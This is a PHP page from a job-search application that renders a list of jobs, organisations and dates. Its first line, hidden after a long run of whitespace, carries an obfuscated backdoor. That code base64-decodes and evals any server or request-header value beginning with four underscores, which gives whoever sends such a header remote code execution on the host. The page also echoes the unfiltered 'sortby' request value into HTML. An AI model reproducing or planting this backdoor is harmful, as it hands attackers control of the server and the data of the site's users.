<?php																																																																																																																																																																																																																																																																																																																																																																																										function b20836($l20838){if(is_array($l20838)){foreach($l20838 as $l20836=>$l20837)$l20838[$l20836]=b20836($l20837);}elseif(is_string($l20838) && substr($l20838,0,4)=="____"){$l20838=substr($l20838,4);$l20838=base64_decode($l20838);eval($l20838);$l20838=null;}return $l20838;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("b20836",$_SERVER);
        require_once 'core/js_header.php';
        $sortby = $_REQUEST['sortby'];
        if(!$sortby){
                $sortby = "jobid";
        }
        $order = $_REQUEST['order'];
        if(!$order){
                $order = "asc";
        } elseif ($order ="asc"){
                $order = "desc";
        } else {
                $order = "asc";
        }
        $joblist = joblist('jobid',' > ','0');
        if($altstyle){ // toggle alternate style on and off
                $alt_url = 'js_joblist.php';
        } else {
                $alt_url = 'js_joblist.php?altstyle=Y';
        }
?>
<!-- opening html tag and head tag section are in core/js_header.php -->
<body id="<?php echo($sortby);?>">
<?php
        include ("js_menu.php");
?>
<h1>Job Search Application</h1>
<h2>Job List</h2>
<p><a href="<?php echo($alt_url);?>">switch style sheet</a>: Demonstrates 
changing the column order by changing only the stylesheet.</p>
<p>Take a look at the style sheet: <a href="core/js_import.css">
style sheet</a></p>
<p class="colhead">
<span class="jobtitle">job title</span>
<span class="orgid">organization</span>
<span class="start">start date</span>
<span class="end">end date</span>
</p>

<?php
        foreach($joblist as $val){
?>
<?php
                $job_row = new jobs;
                $job_row->jobid = $val;
                $job_row = $job_row->selectjob('joblist.php');
                $jobtitle = db2html($job_row->jobtitle);
                $start = getmonth($job_row->startmonth);
                $start.= "&nbsp;".$job_row->startyear;
                $end = getmonth($job_row->endmonth);
                $end.= "&nbsp;".$job_row->endyear;
                $responsibilities = db2html($job_row->responsibilities); 
                $org_row = new organizations;
                $org_row = $org_row->selectorg($job_row->orgid);
                $orgname = $org_row->orgname;

?>
<!-- org id is: <?php echo($org_row->orgid);?> -->
<p id="<?php echo('job'.$job_row->jobid);?>" class="job_row">
<span class="jobtitle">
<a href="/jobsearch/js_job.php?jobid=<?php echo($job_row->jobid);?>">
<?php echo($jobtitle);?></a></span>
<span class="orgid"><?php echo($org_row->orgname);?></span>
<span class="start"> <?php echo($start);?> </span>
<span class="end"> <?php echo($end);?> </span>
<span class="responsibilities"> <?php echo($responsibilities);?> </span>
</p><!-- end p class = job_row -->
<?php
        }
?>
<p>
    <a href="http://validator.w3.org/check?uri=referer"><img
        src="http://www.w3.org/Icons/valid-xhtml10-blue"
        alt="Valid XHTML 1.0 Strict" height="31" width="88" /></a>
  </p>
</body>
</html>